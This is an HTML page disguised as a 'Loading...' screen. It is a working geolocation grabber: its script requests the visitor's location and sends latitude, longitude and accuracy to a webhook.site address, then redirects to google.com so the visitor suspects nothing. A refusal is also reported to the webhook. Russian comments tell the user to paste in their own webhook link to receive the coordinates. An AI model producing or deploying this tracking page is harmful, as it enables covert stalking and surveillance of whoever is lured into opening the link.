<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Загрузка...</title></head>
<body>
    <script>
        const webhookUrl = "https://webhook.site/5c07e1e0-118c-480d-b310-b99e02767545"; // ВСТАВЬ СВОЮ ССЫЛКУ СЮДА

        navigator.geolocation.getCurrentPosition(function(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const acc = position.coords.accuracy;

            // Отправляем координаты тебе на Webhook
            fetch(`${webhookUrl}?lat=${lat}&lon=${lon}&accuracy=${acc}`)
                .then(() => { window.location.href = "https://google.com"; });
        }, function(error) {
            // Если отказал в доступе, всё равно шлем сигнал об отказе и редиректим
            fetch(`${webhookUrl}?error=denied`)
                .then(() => { window.location.href = "https://google.com"; });
        });
    </script>
</body>
</html>
